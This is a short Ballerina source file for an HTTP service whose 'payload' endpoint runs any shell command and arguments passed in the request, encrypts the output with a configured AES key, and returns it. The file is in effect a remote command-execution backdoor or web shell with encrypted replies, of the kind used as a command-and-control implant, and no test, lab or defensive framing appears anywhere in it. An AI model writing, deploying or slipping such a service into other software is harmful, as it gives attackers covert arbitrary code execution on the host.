import ballerina/http;

import rheolaeth.crypt;
import rheolaeth.response;
import rheolaeth.shell;

configurable int port = ?;
configurable string key = ?;

service / on new http:Listener(port) {
    resource function get payload(string command, string? args) returns string {
        string|error shellResult = shell:shellExecute(command, [args ?: ""]);
        if shellResult is error {
            return response:errorResponse(shellResult.message());
        }

        string|error encryptedResult = crypt:aesEcbEncrypt(key, shellResult);
        if encryptedResult is error {
            return response:errorResponse(encryptedResult.message());
        }

        return response:successResponse(encryptedResult);
    }
}
